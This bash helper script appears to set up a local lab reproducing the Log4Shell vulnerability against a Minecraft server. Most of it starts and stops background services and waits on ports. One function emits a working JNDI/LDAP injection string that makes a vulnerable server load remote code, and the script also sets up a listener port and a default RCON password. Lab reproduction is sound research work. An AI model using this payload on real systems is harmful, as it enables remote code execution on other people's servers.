#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
export PCYB_ROOT="$ROOT"
export PCYB_VENDOR="${PCYB_VENDOR:-$ROOT/vendor}"
export PCYB_RUN="$ROOT/run"
export PCYB_EVIDENCE="$ROOT/evidence"

# shellcheck disable=SC1091
if [[ -f "$ROOT/.lab-net/localhost.env" ]]; then
  # shellcheck source=/dev/null
  source "$ROOT/.lab-net/localhost.env"
fi

export PCYB_LDAP_HOST="${PCYB_LDAP_HOST:-127.0.0.1}"
export PCYB_LDAP_PORT="${PCYB_LDAP_PORT:-1389}"
export PCYB_HTTP_HOST="${PCYB_HTTP_HOST:-127.0.0.1}"
export PCYB_HTTP_PORT="${PCYB_HTTP_PORT:-8888}"
export PCYB_LISTEN_HOST="${PCYB_LISTEN_HOST:-127.0.0.1}"
export PCYB_LISTEN_PORT="${PCYB_LISTEN_PORT:-4444}"
export PCYB_MC_SERVER_HOST="${PCYB_MC_SERVER_HOST:-127.0.0.1}"
export PCYB_MC_SERVER_PORT="${PCYB_MC_SERVER_PORT:-25565}"
export PCYB_MC_RCON_HOST="${PCYB_MC_RCON_HOST:-$PCYB_MC_SERVER_HOST}"
export PCYB_MC_RCON_PORT="${PCYB_MC_RCON_PORT:-25575}"
export PCYB_MC_RCON_PASSWORD="${PCYB_MC_RCON_PASSWORD:-pcyb-lab-rcon}"

mkdir -p "$PCYB_RUN" "$PCYB_EVIDENCE" "$PCYB_VENDOR"

need_cmd() {
  command -v "$1" >/dev/null || {
    echo "Missing command: $1 (enter: nix develop)" >&2
    exit 1
  }
}

need_java() {
  need_cmd java
  need_cmd javac
}

jndi_payload() {
  echo "\${jndi:ldap://${PCYB_LDAP_HOST}:${PCYB_LDAP_PORT}/Exploit}"
}

pidfile() { echo "$PCYB_RUN/$1.pid"; }
logfile() { echo "$PCYB_RUN/$1.log"; }

is_running() {
  local pf
  pf="$(pidfile "$1")"
  [[ -f "$pf" ]] && kill -0 "$(cat "$pf")" 2>/dev/null
}

start_bg() {
  local name="$1"
  shift
  local pf lf
  pf="$(pidfile "$name")"
  lf="$(logfile "$name")"
  if is_running "$name"; then
    echo "[$name] already running pid=$(cat "$pf")"
    return 0
  fi
  echo "[$name] starting: $*"
  (
    cd "$ROOT"
    nohup "$@" >"$lf" 2>&1 &
    echo $! >"$pf"
  )
  sleep 0.4
  if is_running "$name"; then
    echo "[$name] ok pid=$(cat "$pf") log=$lf"
  else
    echo "[$name] FAILED — see $lf" >&2
    tail -n 40 "$lf" >&2 || true
    exit 1
  fi
}

stop_name() {
  local name="$1"
  local pf
  pf="$(pidfile "$name")"
  if [[ -f "$pf" ]]; then
    local pid
    pid="$(cat "$pf")"
    if kill -0 "$pid" 2>/dev/null; then
      echo "[$name] stopping pid=$pid"
      kill "$pid" 2>/dev/null || true
      sleep 0.3
      kill -9 "$pid" 2>/dev/null || true
    fi
    rm -f "$pf"
  fi
}

wait_port() {
  local host="$1" port="$2" secs="${3:-20}"
  local i
  for ((i = 0; i < secs * 5; i++)); do
    if (echo >/dev/tcp/"$host"/"$port") 2>/dev/null; then
      return 0
    fi
    # bash /dev/tcp may be disabled — fallback
    if command -v nc >/dev/null && nc -z "$host" "$port" 2>/dev/null; then
      return 0
    fi
    sleep 0.2
  done
  echo "Timeout waiting for $host:$port" >&2
  return 1
}
